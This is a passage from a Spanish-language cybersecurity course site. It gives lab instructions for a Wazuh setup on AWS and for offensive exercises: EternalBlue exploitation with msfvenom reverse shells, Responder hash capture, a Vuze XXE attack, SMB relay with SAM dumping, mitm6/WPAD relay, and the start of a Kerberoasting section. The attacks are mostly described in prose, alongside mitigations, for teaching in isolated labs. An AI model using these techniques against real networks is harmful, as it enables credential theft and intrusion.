pantalla de lanzamiento del laboratorio:</p> <p></p> <p>Le daremos a iniciar laboratorio y esperaremos a que el icono marcado se ponga en verde. Una vez lo est\u00e9, haremos click en \u00e9l para que nos lleve a la p\u00e1gina de administraci\u00f3n de servicios de AWS:</p> <p></p> <p>Una vez en esta p\u00e1gina, el servicio que a nosotros nos interesa en este momento son las instancias EC2. As\u00ed pues, escribimos esto en la caja de b\u00fasqueda:</p> <p></p> <p>Le decimos que queremos lanzar una nueva instancia:</p> <p></p> <p>E iremos completando los detalles necesarios, como nombre o imagen de la m\u00e1quina que se crear\u00e1 (Amazon Linux, Ubuntu, Debian, Windows...). En esta caso se ilustra el ejemplo de la m\u00e1quina cliente Ubuntu pero habr\u00eda que seleccionar seg\u00fan el caso:</p> <p></p> <p>Podemos elegir distintos tipos de instancias, con distintos precios por uso, as\u00ed como propiedades (CPU+RAM). Para el caso de las instancias Linux, nos basta una t2.micro. Para el caso de las Windows, debemos elegir t2.medium para no quedarnos demasiado cortos.</p> <p></p> <p>En el apartado de Claves de sesi\u00f3n, elegiremos vockey. Esto nos permitir\u00e1 m\u00e1s tarde conectarnos a las instancias:</p> <p></p> <p>En configuraciones de red lo \u00fanico que debemos hacer es dejar marcada la opci\u00f3n por defecto Crear grupo de seguridad y marcarle que permita tanto el tr\u00e1fico SSH desde cualquier lugar, como el tr\u00e1fico HTTP desde Internet.</p> <p>Los grupos de seguridad son, de forma aproximada, una especie de Firewall que filtra las conexiones desde y hacia nuestras instancias.</p> <p>\u00a1Atenci\u00f3n!</p> <p>Los clientes Linux y Windows que contendr\u00e1n sendos agentes, alojan su contenido mediante servidores web en el puerto (80), HTTP. Sin embargo, el servidor de Wazuh o Wazuh manager, utiliza s\u00f3lo HTTPS con certificado autofirmado para su interfaz web. </p> <p>Tened esto en cuenta a la hora de crear la instancia y marcad la casilla correspondiente. </p> <p>Si os despist\u00e1is, m\u00e1s adelante se explica c\u00f3mo modificar grupos de seguridad.</p> <p>Tras lanzar la instancia, se encontrar\u00e1 en estado Iniciando y despu\u00e9s pasar\u00e1 a En ejecuci\u00f3n.</p>"},{"location":"segdef/wazuh/#ec2-windows","title":"EC2 Windows","text":"<p>Lanzamos otra vez una nueva instancia, indicando el nombre que queramos y dici\u00e9ndole que se tratar\u00e1 de un Windows:</p> <p></p> <p>Puesto que carecemos de la opci\u00f3n de un Windows 10/11, utilizaremos entonces un Windows Server como cliente.</p> <p>Como se indic\u00f3 anteriormente, ha de ser t2.medium: </p> <p></p> <p>De nuevo, indicamos las claves vockey y permitimos tanto tr\u00e1fico SSH, como HTTP:</p> <p></p> <p>Tras lanzar la instancia, se encontrar\u00e1 en estado Iniciando y despu\u00e9s pasar\u00e1 a En ejecuci\u00f3n.</p>"},{"location":"segdef/wazuh/#cuestiones-genericas","title":"Cuestiones gen\u00e9ricas","text":""},{"location":"segdef/wazuh/#mas-reglas-en-los-grupos-de-seguridad","title":"M\u00e1s reglas en los grupos de seguridad","text":"<p>Para el servidor de Wazuh y para la m\u00e1quina atacante, vamos a modificar sus grupos de seguridad para que puedan comunicarse con cualquier m\u00e1quina de la red sin problemas.</p> <p>Marcamos la instancia que queramos modificar y seleccionamos la pesta\u00f1a Seguridad:</p> <p></p> <p>Localizamos el grupo de seguridad y haremos click sobre \u00e9l:</p> <p></p> <p>Una vez dentro del grupo, editamos las reglas de entrada:</p> <p></p> <p>Las instancias se crean por defecto en la red <code>172.31.0.0/16</code>. Permitiremos entonces todo el tr\u00e1fico de entrada proveniente de dicha red, a\u00f1adiendo una regla a tal efecto:</p> <p></p>"},{"location":"segdef/wazuh/#conexion-remota-a-las-maquinas","title":"Conexi\u00f3n remota a las m\u00e1quinas","text":""},{"location":"segdef/wazuh/#linux","title":"Linux","text":"<p>Accedemos a la pantalla primig\u00e9nia desde donde lanzamos nuestro laboratorio y en la secci\u00f3n de AWS Details tendremos la posibilidad de descargarnos unas claves para la conexi\u00f3n que queremos llevar a cabo. As\u00ed pues, las descargamos, tal y como indica el paso 2:</p> <p></p> <p>Es importante darle los permisos adecuados a la clave privada reci\u00e9n descargada, de otra forma no nos permitir\u00e1 conectarnos. Una vez hecho, basta con realizar una conexi\u00f3n normal por SSH pero indicando con el par\u00e1metro <code>-i</code>que utilizaremos el archivo de claves que nos desacargamos en el paso anterior:</p> <p></p> <p>La IP p\u00fablica de cada instancia al a que queramos conectarnos podemos consultarla as\u00ed:</p> <p></p> <p>Y de esta forma ya podemos realizar cualquier acci\u00f3n que necesit\u00e1semos llevar a cabo, tal y como si se tratase de una m\u00e1quina virtual en nuestra m\u00e1quina.</p>"},{"location":"segdef/wazuh/#windows_2","title":"Windows","text":"<p>Para el caso de Windows, en lugar de conectarnos usando SSH, lo haremos mediante escritorio remoto (RDP). Para ello el proceso es un poco distinto, ve\u00e1moslo.</p> <p>Igual que para el caso de Linux, necesitaremos la clave privada que nos podemos descargar. No obstante, la conexi\u00f3n se realizar\u00e1 utilizando alg\u00fan cliente RDP. Si utiliz\u00e1is Windows para conectaros, el cliente lo tendr\u00e9is nativo. Si por otra parte utiliz\u00e1is Linux, necesitar\u00e9is alguna aplicaci\u00f3n tipo Remmina o similar.</p> <p>El primer paso ser\u00e1 seleccionar nuestra instancia Windows y darle a Conectar:</p> <p></p> <p>En esta secci\u00f3n le diremos que nos vamos a conectar mediante un cliente RDP:</p> <p></p> <p>Nos descargaremos el archivo .rdp que utilizaremos para conectarnos y, tras ello, le daremos a Obtener contrase\u00f1a para obtener las credenciales a utilizar:</p> <p></p> <p>Para poder obtener nuestra contrase\u00f1a debemos hacer uso del archivo de clave privada que nos descargamos en seccines anteriores (es el mismo para todas las instancias).</p> <p>Lo cargaremos y, una vez hecho, le daremos a descifrar contrase\u00f1a:</p> <p></p> <p>Una vez obtenida la contrase\u00f1a no queda m\u00e1s que utilizar el cliente RDP elegido (en mi caso Remmina) para abrir el archivo .rdp y conectarnos utilizando la contrase\u00f1a obtenida:</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u00a1Atenci\u00f3n!</p> <p>El laboratorio se apaga autom\u00e1ticamente a las 4 horas, tiempo m\u00e1s que suficiente para llevar a cabo la pr\u00e1ctica. En caso contrario, podr\u00e9is reiniciarlo puesto que s\u00f3lo se apagan las instancias pero no se pierde el trabajo.</p> <p>Si trabaj\u00e1is en varias tandas o acab\u00e1is antes de las 4 horas, apagadlo vosotros para evitar gastos innecearios en vuestro cr\u00e9dito de 100$. Para ello, en la p\u00e1gina de lanzamiento del laboratorio, esta vez le daremos a End lab</p>"},{"location":"segdef/wazuh/#despliegue-automatizado-del-escenario","title":"Despliegue automatizado del escenario","text":"<p>Para desplegar este escenario de forma automatizada en AWS se puede hacer uso del siguiente repositorio: </p> <p>https://github.com/raul-profesor/wazuh-webshells-terraform.git</p>"},{"location":"segof/","title":"Apuntes y ejercicios pr\u00e1cticos del curso de especializaci\u00f3n de ciberseguridad en IES Severo Ochoa (Elche)","text":"<p>Los ejercicios y conocimientos contenidos en las pr\u00e1cticas y/o apuntes de  todos los m\u00f3dulos tienen exclusivamente prop\u00f3sito formativo, por lo que  nunca se deber\u00e1n utilizar con fines maliciosos o delictivos.</p> <p>Ning\u00fan alumno o alumna de este curso, ni profesor o profesora como  docentes, ser\u00e1n responsables de los da\u00f1os directos o indirectos que  pudieran derivarse del uso inadecuado de las herramientas y mecanismos  expuestos.</p>"},{"location":"segof/EternalBlue/","title":"Explotaci\u00f3n de vulnerabilidad EternalBlue (MS17-010)","text":""},{"location":"segof/EternalBlue/#explotacion-de-eternalblue-sin-metasploit","title":"Explotaci\u00f3n de EternalBlue sin Metasploit","text":"<p>Para este ejercicio vamos a hacer uso de una m\u00e1quina de TryHackMe, especialmente dise\u00f1ada para ser vulnerable a EternalBlue: Sala de THM</p> <p>En este caso no vamos a completar la sala tal cual est\u00e1 escrita en THM, sino que el proceso lo realizaremos manualmente, sin utilizar la herramienta Metasploit. No obstante, nos aprovecharemos de esta m\u00e1quina.</p> <p>Os detallo los apartados que deb\u00e9is documentar a la hora de entregar el informe del proceso completo en Aules (explicaci\u00f3n + capturas de pantalla)</p> <ol> <li>El primer paso ser\u00e1, como ya vimos en clases anteriores, realizar un escaneo de puertos con Nmap. Recordad los conceptos ya vistos.</li> </ol> <p>Pista</p> <p>Una vez hay\u00e1is descubierto los puertos abiertos, haced un nuevo escaneo pero esta vez indicad directamente el puerto de SMB (\u00bfcu\u00e1l es?) utilizando el switch u opci\u00f3n de nmap adecuada.</p> <p>De la misma forma, puesto que vamos en busca y captura de EternalBlue, una vulnerabilidad, utilizad la opci\u00f3n de los scripts de Nmap e indic\u00e1ndole la categor\u00eda vuln.</p> <ol> <li> <p>A la hora de explotar la vulnerabilidad, pod\u00e9is clonaros este repositorio de Github, que contiene los scripts y archivos que necesitaremos.    Leed atentamente las instrucciones que vienen explicadas en el repositorio, especialmente las del apartado Usage</p> <ul> <li> <p>Utilizando el script eternal_checker.py, comprobad si la m\u00e1quina objeto del ataque est\u00e1 parca.</p> </li> <li> <p>Seguid los pasos y compilad el shellcode adecuado.</p> </li> </ul> <p>Concepto</p> <p>Un shellcode es un c\u00f3digo escrito normalmente en ensamblador y compilado para un desterminado procesador que se inyecta en la memoria de un proceso para ejecutar lo que se le indique. En nuestro caso, una shell inversa.</p> <p>Atenci\u00f3n</p> <ul> <li> <p>Elegiremos la opci\u00f3n de generar la shell inversa (reverse shell) con msfvenom. Msfvenom es una instancia en l\u00ednea de comandos que se usa para generar y codificar (para evitar detecciones de antimalware) payloads o shellcodes.</p> </li> <li> <p>Compilaremos para la arquitectura de 32 bits (x86) y para la de 64 (x64), puesto que en principio no sabemos qu\u00e9 versi\u00f3n de sistema operativo estamos atacando.</p> </li> <li> <p>Os preguntar\u00e1 a qu\u00e9 puerto debe conectarse la reverse shell para cada una de las dos arquitecturas. Poned puertos diferentes.</p> </li> <li> <p>Le diremos que queremos generar una shell normal (cmd) y no una shell de meterpreter (terminal en Metasploit)</p> </li> <li> <p>Por \u00faltimo, le diremos que queremos generar un payload stageless.</p> </li> </ul> </li> <li> <p>El shellcode generado tendr\u00e1 el nombre <code>sc_all.bin</code> y se habr\u00e1 generado dentro de la carpeta de los shellcodes.</p> </li> <li> <p>Finalmente utilizaremos el script en python que nos permitir\u00e1 explotar la vulnerabilidad. Los scripts est\u00e1n nombrados como <code>e..._exploitX.py</code>, donde la X es el n\u00famero de versi\u00f3n del sistema operativo. Del escaneo de Nmap o de la salida del script de chequeo del estado de parcheo, habr\u00e9is obtenido la versi\u00f3n adecuada.</p> </li> </ol>"},{"location":"segof/EternalBlue/#explotacion-de-eternalblue-con-metasploit","title":"Explotaci\u00f3n de EternalBlue con Metasploit","text":"<p>En este caso, vamos a explotar EternalBlue haciendo uso de Metasploit.</p> <p>Deb\u00e9is seguir el proceso que ya se ha comentado en la secci\u00f3n correspondiente; iniciar <code>msfconsole</code>, buscar un exploit para EternalBlue, configurar las opciones correspondientes y lanzar el exploit.</p> <p>Este proceso debe quedar reflejado con detalle, incluyendo capturas de pantalla, en un informe que se entregar\u00e1 en Aules.</p>"},{"location":"segof/HackingAD1/","title":"Ataques en entornos Active Directory","text":""},{"location":"segof/HackingAD1/#setup-del-laboratorio","title":"Setup del laboratorio","text":""},{"location":"segof/HackingAD1/#windows-server","title":"Windows Server","text":"<ul> <li>Administrador de dominio</li> <li>Usuario raso 1 de dominio </li> <li>Copiar usuario raso 2 con otro nombre </li> <li>Copiar usuario administrador con otro nombre</li> <li> <p>Copiar el usuario copiado de administrador como cuenta de servicio SQL</p> <p>Para esta cuenta, con el fin de utilizarla m\u00e1s adelante para demostrar el ataque <code>Kerberoasting</code>, debemos establecerle un SPN. As\u00ed pues, en un cmd que abriremos como administrador, debemos introducir lo siguiente:</p> <p></p> </li> </ul> <p>Crear una compartici\u00f3n de archivos: <code>Server Manager &gt; File and Storage Service &gt; Shares &gt; Task &gt; New Share &gt; SMB Quick</code></p>"},{"location":"segof/HackingAD1/#clientes-windows-10","title":"Clientes Windows 10","text":"<ul> <li>En ambos, crear una carpeta compartida.</li> <li>Unir las m\u00e1quinas al dominio</li> <li>Hacer al usuario raso 1 administrador local del primer cliente</li> <li>Hacer al usuario raso 1 y 2 administradores local del segundo cliente tambi\u00e9n</li> </ul>"},{"location":"segof/HackingAD1/#responder","title":"Responder","text":"<p>Si os fij\u00e1is en este art\u00edculo, aunque un poco antiguo, da una idea de las formas m\u00e1s b\u00e1sicas de ataques contra Active Directory para capturar hashes.</p> <p>En la primera se habla de envenenamiento LLMNR. Este protocolo, bastante antiguo, permite identificar hosts cuando el DNS falla en esta tarea.</p> <p>Se conoce como envenenamiento LLMNR aquel ataque en el cual el cliente intenta acceder a un servicio de red inexistente y que por lo tanto no tiene una resoluci\u00f3n DNS exitosa. En este caso, se lanza un mensaje broadcast LLMNR para resolver la direcci\u00f3n, cosa que el atacante aprovecha para hacerse pasar por ese servicio y solicitar la pertinenete autorizaci\u00f3n al cliente/v\u00edctima.</p> <p></p> <p>De esta forma, es posible capturar hashes NLTMv2 y descifrarlos offline mediante diccionarios.</p> <p>Para llevar a cabo un ataque de este tipo quiz\u00e1s la herramienta m\u00e1s conocida sea Responder, la m\u00e1s famosa herramienta para envenenamiento LLMNR/LLMNR, NBT-NS Y MDNS (protocolos de funci\u00f3n similar). Responder tiene adem\u00e1s incorporado servidores HTTP/SMB/MSSQL/FTP/LDAP falsos que sportan NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP y Basic HTTP authentication.</p>"},{"location":"segof/HackingAD1/#procedimiento","title":"Procedimiento","text":"<p>Responder s\u00f3lo est\u00e1 disponible para Linux y viene preinstalado en Kali, Parrot y otras. Al ejecutarlo, podemos ver que se inician los envenenadores y los servidores falsos (podemos indicarlo mediante opciones por l\u00ednea de comandos que se inicien o no seg\u00fan qu\u00e9 elementos):</p> <p></p> <p>Obviamente el atacante ha de estar en la misma red que la v\u00edctima. Esta \u00faltima, de alguna manera (\u00bfos acord\u00e1is de la pr\u00e1ctica anterior de phising?), ha de ser convencida de intentar acceder a un servicio inexistente.</p> <p>Por ejemplo, intentando acceder a un recurso compartido con un nombre inexistente, ocurre lo siguiente:</p> <p></p> <p>Es decir, Responder est\u00e1 simulando ser un servidor SMB que requiere autorizaci\u00f3n para su acceso. Si la v\u00edctima no se da cuenta del enga\u00f1o e introduce sus credenciales:</p> <p></p> <p>Responder las captura al instante en forma de Usuario, dominio y hash:</p> <p></p> <p>Con esto, ya tendr\u00edamos la parte ard\u00faa del trabajo hecha, quedar\u00eda descifrar este hash. La herramienta que nos puede ayudar en este menester es hashcat, por ejemplo. No obstante, lo comprobaremos.</p> <p>\u00bfPuede hashcat hacer algo con los hashes NTLMv2? Veamos que nos dice el manual:</p> <p></p> <p>Todo parece indicar que hay una forma de indicarle a hashcat que se trata de un hash de este tipo y que act\u00fae en consecuencia.</p> <p>Tarea</p> <p>Reproduce el escenario con un password en el cliente lo suficiente d\u00e9bil como para que no nos lleve mucho tiempo el proceso de descifrado con hashcat (<code>password.123</code> por ej.)</p> <p>Averigua como utilizar hashcat con la opci\u00f3n para hashes NTLMv2 y con el diccionario rockyou.txt (presente en cualquier distribuci\u00f3n dedicada a la seguridad).</p>"},{"location":"segof/HackingAD1/#aplicacion-en-el-mundo-real","title":"Aplicaci\u00f3n en el mundo real","text":"<p>Aunque algo antigua, resulta \u00fatil revisitar la vulnerabilidad CVE-2018-13417. </p> <p>Se trata de una vulnerabilidad  XXE (XML External Entity Processing) en el cliente de Bittorrent Vuze. Como podemos leer aqu\u00ed, \"una vulnerabilidad de entidad externa XML se produce cuando el servicio que analiza (o en palabras m\u00e1s sencillas, lee y procesa) los mensajes XML enviados por el cliente, acepta una definici\u00f3n externa del propio mensaje XML.\"</p> <p>Vamos a intentar c\u00f3mo explotar esta vulnerabilidad con los conceptos previos.</p>"},{"location":"segof/HackingAD1/#la-victima","title":"La v\u00edctima","text":"<p>Se tratar\u00e1 de un Windows 10 con una instalaci\u00f3n nueva de Vuze (ha de ser la versi\u00f3n 5.7.6.0):</p> <p></p>"},{"location":"segof/HackingAD1/#atacante","title":"Atacante","text":"<p>Yo he utilizado Parrot pero podr\u00e9is utilizar Kali o la que m\u00e1s os guste. En este caso vamos a llevar a cabo un remember y haremos uso de la herramienta Evil-ssdp para hacer spoofing de respuestas SSDP, creando dispositivos falsos UPnP y detectar vulnerabilidadews XXE en aplicaciones UPnP.</p> <p></p>"},{"location":"segof/HackingAD1/#explicacion","title":"Explicaci\u00f3n","text":"<p>Cuando Vuze intenta descubrir otros dispositivos en la red local, SSDP env\u00eda un mensaje UDP multicast a la direcci\u00f3n 239.255.255.250 y puerto 1900. Esto permite a Vuze localizar dispositivos UPnP. Es por esto precisamente que el atacante ser\u00e1 capza de responder a estos paquetes con una herramienta como evil-ssdp, dici\u00e9ndole al cliente que es un dispositovo compartido llamado Device Descriptor.</p> <p>Tras esto, Vuze parsea el contenido del XML de Device Descriptor sobre HTTP, pudiendo as\u00ed obtener archivos, hashes o inclusos shells del atacante. En nuestro caso particular, vamos a ejecutar un ataque XXE que producir\u00e1 una conexi\u00f3n SMB, permiti\u00e9ndonos capturar el hash del desaf\u00edo/respuesta.</p> <p>Por defecto, evil-ssdp levanta un servidor web y Device Descriptor est\u00e1 alojado en:</p> <p><code>http://&lt;IP_Atacante&gt;:8888/ssdp/device-desc.xml</code></p> <p>La ruta de device-desc.xml obtiene los datos del archivo device.xml, ubicado en la carpeta <code>/templates/xxe-smb</code>. Por suerte, evil-ssdp  ya nos ha preconfigurado una l\u00ednea para el ataque XXE que invocar\u00e1 la conexi\u00f3n SMB por nosotros:</p> <p></p> <p></p> <p></p> <p>Con todo ya dispuesto, iniciamos responder, iniciamos evil-ssdp y tras ello arrancamos Vuze en nuestra m\u00e1quina v\u00edctima Windows 10:</p> <p></p> <p></p> <p></p> <p>Y la magia se produce casi al instante.</p>"},{"location":"segof/HackingAD1/#que-esta-ocurriendo-entre-bambalinas","title":"\u00bfQu\u00e9 est\u00e1 ocurriendo entre bambalinas?","text":"<p>Si analizamos el escenario como mandan los canones con Wireshark, veremos cosas interesantes.</p> <ol> <li> <p>El primer paquete es un multicasting UDP v\u00eda SSSDP. Tambi\u00e9n vemos su posterior respuesta informando al cliente de la localizaci\u00f3n del dispositivo Device Descriptor</p> <p></p> </li> <li> <p>Despu\u00e9s se roduce un 3-way handshake y se lleva a cabo la petici\u00f3n HTTP GET por parte del cliente a Device Descriptor</p> <p></p> </li> <li> <p>Se inicia entonces la conexi\u00f3n SMB por parte del cliente, tras una negociaci\u00f3n a prop\u00f3sito de la versi\u00f3n SMB a utilizar. Finalmente el cliente envia su hash NTLMv2 para autenticarse en el servicio y es entonces cuando Responder lo captura:</p> <p></p> <p>El valor del hash mostrado en la imagen de la captura de Wireshark debe coincidir con el captura por Responder.</p> </li> </ol>"},{"location":"segof/HackingAD1/#smb-relay","title":"SMB Relay","text":"<p>Info</p> <p>Microsoft est\u00e1 empezando a hacer m\u00e1s enf\u00e1sis en algunos aspectos hist\u00f3ricos de su seguridad. Uno de ellos era que por defecto los mensajes SMB no estaban firmados, cosa que parece que empieza a cambiar y a requerirse que s\u00ed lo haga por defecto.</p> <p>\u00bfQu\u00e9 significa que los mensajes SMB est\u00e9n firmados?</p> <p>La firma SMB (tambi\u00e9n conocida como firmas de seguridad) es un mecanismo de seguridad en el protocolo SMB. La firma SMB significa que cada mensaje SMB contiene una firma que se genera mediante la clave de sesi\u00f3n. El cliente coloca un hash de todo el mensaje en el campo de firma del encabezado SMB.</p> <p>Para realizar un ataque de tipo SMB Relay es imprescindible que estos mensajes no vayan firmados, as\u00ed que tenemos esta opci\u00f3n activada por defecto en los clientes (no en el DC), debemos desactivarla. \u00bfC\u00f3mo? As\u00ed.</p> <p>En un principio esto no nos aleja de un entorno real puesto que muchos equipos tendr\u00e1n a\u00fan versiones antiguas de Windows o incluso habr\u00e1n desactivado las firmas.</p> <p>En esta ocasi\u00f3n s\u00ed vamos a desactivar nuestros Windows Defender en ambos clientes Windows puesto que lo que intentamos es presentar los fundamentos de este ataque, no este ataque junto con la evasi\u00f3n de antivirus.</p>"},{"location":"segof/HackingAD1/#que-es-smb-relay","title":"\u00bfQu\u00e9 es SMB Relay?","text":"<p>En lugar de intentar descifrar o crackear los hashes que hemos recopilado con el responder, podemos hacer relay de esos hashes a m\u00e1quinas potencialmente vulnerables con el fin de obtener acceso a ellas.</p> <p>Para conseguir nuestro fin necesitamos dos requisitos fundamentales:</p> <ul> <li>SMB Signing tiene que estar deshabilitado en el objetivo o v\u00edctima</li> <li>Las credenciales de las que se hace relay, que son reenviadas, deben tener privilegios de admin en la m\u00e1quina (para el caso que aqu\u00ed se muestra)</li> </ul> <p>Los pasos a seguir son:</p> <ol> <li> <p>Editamos la configuraci\u00f3n del responder para desactivar los servidores fake SMB y HTTP. Esto quiere decir que estaremos escuchando, pero no respondiendo. Por lo tanto, capturaremos la petici\u00f3n de acceso con responder y haremos relay de ella con otra herramienta.</p> <p></p> <p></p> </li> <li> <p>Hacemos relay de la petici\u00f3n de autorizaci\u00f3n con <code>ntlmrelayx</code>, que utilizar\u00e1 un archivo de texto donde vendr\u00e1n definida/s la v\u00edctima/s.</p> <p></p> </li> <li> <p>Y si hemos accedido con un usuario con privilegios de administrador, veremos que se produce un dumping de la SAM:</p> <p> </p> </li> </ol>"},{"location":"segof/HackingAD1/#como-puedo-saber-las-maquinas-de-la-red-que-tiene-smb-sin-firmar","title":"\u00bfC\u00f3mo puedo saber las m\u00e1quinas de la red que tiene SMB sin firmar?","text":"<p>Una vez m\u00e1s podemos ayudarnos de nmap:</p> <pre><code>nmap --script=smb2-security-mode -p445 192.168.18.0/24\n</code></pre> <p>Tarea</p> <p>Busca la forma de conectarte remotamente a la m\u00e1quina con las credenciales comprometidas, usando esas credenciales y la herramietna <code>psexec</code>.</p>"},{"location":"segof/HackingAD1/#mitigacion-del-ataque-smb-relay","title":"Mitigaci\u00f3n del ataque SMB Relay","text":"<ul> <li>Activar el firmado de mensajes SMB (SMB signing) en todos los dispositivos<ul> <li>Contrapartida: puede provocar lentintud a la hora de copiar archivos</li> </ul> </li> <li>Deshabilitar autenticaci\u00f3n NTLM<ul> <li>Contrapartida: Si Kerberos, por lo que sea, deja de estar disponible en la red, Windows volver\u00e1 a NTLM</li> </ul> </li> <li>Jerarquizaci\u00f3n de cuentas (limitar los administradores de dominio a tareas espec\u00edficas)</li> <li>Restricci\u00f3n de administradores locales<ul> <li>Contrapartida: Con toda probabilidad aumentar\u00e1 las llamadas a soporte inform\u00e1tico en la empresa</li> </ul> </li> </ul>"},{"location":"segof/HackingAD1/#ataques-ipv6","title":"Ataques IPv6","text":"<p>Hace muchos a\u00f1os ya que venimos escuchando que la implantaci\u00f3n de IPv6 es inminente, que no quedan direcciones IPv4 disponibles y que ese es el destino inmediato e inexorable.</p> <p>No obstante, la realidad es un tanto distinta. Mientras que s\u00ed es cierto que IPv6, aunque muy lentamente, se abre paso en Internet, en las redes internas de las empreass es bastante raro verlo. Sin embargo, muchas de estas empresas desconocen que a pesar de su desuso, Windows desde su versi\u00f3n Vista, as\u00ed como sus versiones de servidor, tienen IPv6 activado por defecto y \u00e9ste tiene preferencia sobre IPv4.</p>"},{"location":"segof/HackingAD1/#dns-spoofing","title":"DNS Spoofing","text":"<p>Si tenemos una red montada en IPv4, como es el caso de nuestro laboratorio, es probable que tengamos IPv6 tambi\u00e9n activo. En ese caso, cuando un host se loguea en una red, intentar\u00e1 pedir la configuraci\u00f3n por DHCPv6 y es aqu\u00ed cuando nos aprovecharemos de ello, ya que como atacantes nos autodesignaremos como DNS primario para IPv6.</p>"},{"location":"segof/HackingAD1/#wpad","title":"WPAD","text":"<p>Web Proxy Autodiscovery Protocol (WPAD) es un m\u00e9todo mediante el cual los clientes pueden descubrir la URL en la que se haya ubicado el archivo de configuraci\u00f3n que deben utilizar en la red en la que se encuentran ubicados.</p> <p>Como podemos ver en el siguiente esquema sacado de esta wiki:</p> <p></p> <p>Los clientes a la hora de utilizar la red, preguntan si existe alg\u00fan proxy a utilizar y d\u00f3nde pueden encontrar la configuraci\u00f3n del mismo para hacer uso de \u00e9l.</p> <p>Antiguamente la direcci\u00f3n IP del servidor que proporcionaba el archivo wpad.dat se resolv\u00eda usando el DNS y, si \u00e9ste no devolv\u00eda ninguna direcci\u00f3n, se pod\u00eda resolver de forma insegura con protocolos de broadcast como LLMNR. Un atacante pod\u00eda contestar a este broadcast, fingir ser el servidor que alojaba el archivo wpad y pedir autenticaci\u00f3n al cliente para serv\u00edrselo. Esta autenticaci\u00f3n era proporcionada por Windows sin interacci\u00f3n del usuario. De esta forma el atacante obten\u00eda unas credenciales NTLM de las que pod\u00eda hacer relay.</p> <p>As\u00ed las cosas, en 2016 Microsoft public\u00f3 un bolet\u00edn de seguridad que intentaba mitigar estos ataques con dos nuevas medidas:</p> <ul> <li>La localizaci\u00f3n del archivo WPAD s\u00f3lo pod\u00eda proporcionarse mediante DNS \u00fanicamente, excluyendo protocolos de broadcast</li> <li>La autenticaci\u00f3n ya no se realiza autom\u00e1ticamente sin interacci\u00f3n del usuario</li> </ul>"},{"location":"segof/HackingAD1/#nuevos-mecanismos-para-explotar-wpad","title":"Nuevos mecanismos para explotar WPAD","text":"<p>De las medidas mencionadas anteriormente, la primera puede ser f\u00e1cilmente bypasseada haciendo uso de la aplicaci\u00f3n mitm6. </p> <p>En cu\u00e1nto el atacante se postule como el servidor DNS IPv6 de la red, los clientes empezar\u00e1n a preguntarle por la direcci\u00f3n del archivo WPAD. Es tan sencillo como que este servidor diga que dicho archivo se encuentra alojado en su misma IP. Este m\u00e9todo funciona incluso si la organizaci\u00f3n realmente tiene un archivo WPAD propio (aunque cortar\u00e1 todo acceso a Internet).</p> <p>En cuanto a la segunda protecci\u00f3n, requiere un poco m\u00e1s de trabajo. Cuando el cliente solicite el archivo WPAD, no se le requerir\u00e1 en ese instante ninguna autorizaci\u00f3n sino que se le proveer\u00e1 un archivo WPAD v\u00e1lido en el que se establece la m\u00e1quina atacante como proxy. As\u00ed, cuando la m\u00e1quina v\u00edctima lleve a cabo alguna acci\u00f3n que requiera con una conexi\u00f3n a Internet, utilizar\u00e1 al atacante como proxy y \u00e9ste le devolver\u00e1 un HTTP 407 Proxy Authentication required.</p> <p>El error HTTP 407 es similar al error 401, que se produce por un acceso no autorizado. La \u00fanica diferencia es que en el error 407 falla la autenticaci\u00f3n con un proxy y no con una conexi\u00f3n directa al servidor. </p> <p>De esta forma y casi sin enterarnos, Windows enviar\u00e1 con gusto el desaf\u00edo/respuesta NTLM al atacante para que pueda hacer relay a cualquier otro servicio.</p> <p>En este enlace encontramos la siguiente imagen que lo describe muy bien:</p> <p></p> <p>Tarea</p> <p>Vuestra tarea ser\u00e1 buscar informaci\u00f3n sobre c\u00f3mo llevar a cabo este ataque y ponerlo en pr\u00e1ctica para, posteriormente, entregar un informe detallando el proceso que hab\u00e9is seguido. Algunas pistas que os servir\u00e1n:</p> <ul> <li>Deb\u00e9is partir del escenario que ya ten\u00e9is configurado</li> <li>Deb\u00e9is instalar los servicios de certificado en el DC (controlador de dominio). Buscad informaci\u00f3n o utilizad el link en la secci\u00f3n de Referencias.</li> <li>Necesitar\u00e9is dos herramientas, mitm6 y ntlmrelayx</li> <li>Realizad primero el ataque con un usuario normal y echad un vistazo a toda la informaci\u00f3n que se obtiene. Buscad alg\u00fan \"descuido\" que d\u00e9 informaci\u00f3n demasiado sensible de alguna cuenta.</li> <li>Tras utilizar un usuario sin privilegios, proceded ahora a realizar el ataque con un usuario administrador de dominio y explicad qu\u00e9 ha sucedido. Comprobadlo en el DC.</li> </ul> <p>Si todo sale bien, ir\u00e9is viendo pantallas similares a esta:</p> <p></p> <p></p> <p></p> <p></p>"},{"location":"segof/HackingAD1/#defensas-o-mitigaciones-ante-este-ataque","title":"Defensas o mitigaciones ante este ataque","text":"<ol> <li>La primera, como es de esperar, ser\u00eda deshabilitar IPv6 si no est\u00e1 siendo utilizado en nuestra red empresarial.</li> <li>La segunda ser\u00eda deshabilitar la autodetecci\u00f3n de configuraci\u00f3n de proxy (WPAD) mediante GPO. Muchas veces las redes empresariales realmente s\u00ed utilizan un archivo PAC con la configuraci\u00f3 del proxy, as\u00ed que es recomendable configurar directamente la URL de este archivo en lugar de confiar en la detecci\u00f3n autom\u00e1tica.</li> <li>Por \u00faltimo, la \u00fanica soluci\u00f3n adecuada para evitar los NTLM relay es deshabilitar NTLM y utilizar \u00edntegramente Kerberos. Aunque ya hemos visto que muchas veces esto no es posible. En estos casos ya hemos dicho que es muy recomendable tener configuada la firma de mensajes SMB y/o LDAP.</li> </ol>"},{"location":"segof/HackingAD1/#kerberoasting","title":"Kerberoasting","text":""},{"location":"segof/HackingAD1/#kerberos","title":"Kerberos","text":"<p>Lo primero que debemos abordar es c\u00f3mo funciona el servicio de autenticaci\u00f3n Kerberos. Para ello, m\u00e1s que reinventar la rueda, os remito a algunos links que lo explican bastante bien:</p> <ul> <li> <p>En este art\u00edculo de Tarlogic, se explica el funcionamiento, con la explicaci\u00f3n de los mensajes intercambiados y algunos ataques. De esa misma p\u00e1gina, un resumen gr\u00e1fico ser\u00eda:</p> <p></p> <ol> <li>El cliente env\u00eda una petici\u00f3n de autenticaci\u00f3n al controlador de dominio</li> <li>Si es exitosa, la respuesta contiene un Ticket Granting Ticket (TGT). Este ticket \u00fanicamente sirve para demostrar que la autenticaci\u00f3n ha sido exitosa y que el cliente tiene permiso para solicitar un TGS (Ticket Granting Service), que no es m\u00e1s que un ticket para un servicio concreto de la red.</li> <li>Se solicita el TGS deseado. Antes de emitir el TGS, se valida el TGT. Si la 